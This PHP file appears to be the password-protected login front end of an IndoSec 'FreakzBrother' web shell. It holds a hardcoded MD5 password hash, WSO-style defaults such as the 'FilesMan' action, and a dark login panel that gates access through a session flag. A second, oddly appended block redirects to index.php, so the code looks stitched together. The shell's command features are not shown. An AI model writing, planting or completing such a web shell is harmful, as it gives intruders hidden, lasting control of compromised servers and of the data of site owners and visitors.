<?php
$aupas 			= "6d6141f874ff8b050cb2365d33ea34ab";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_shell(){
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="theme-color" content="#343a40"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="{ IndoSec }"/>
		<title>PANEL FREAKZBROHTER</title>
		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
	</head>
	<body class="bg-dark text-center text-light">
		<div class="container text-center mt-3">
			<h1>AMAZON FREAKZBROTHER V2.3</h1>
			<p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> Please Login</p>
			<form method="post">
				<div class="form-group input-group">
					<div class="input-group-prepend">
						<div class="input-group-text"><i class="fa fa-user"></i></div>
					</div>
					<input type="password" name="pass" placeholder="User Id..." class="form-control">
				</div>
				<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
			</form>
		</div>
		<a class="text-muted fixed-bottom mb-3">Copyright 2019 @KamenCoder</a>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
	if(isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)){
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	}else{
		login_shell();
	}
}
?>
<?php
session_start();
if (!isset($_SESSION['user'])) {
    $_SESSION['user'] = true;
    header("location: index.php");
}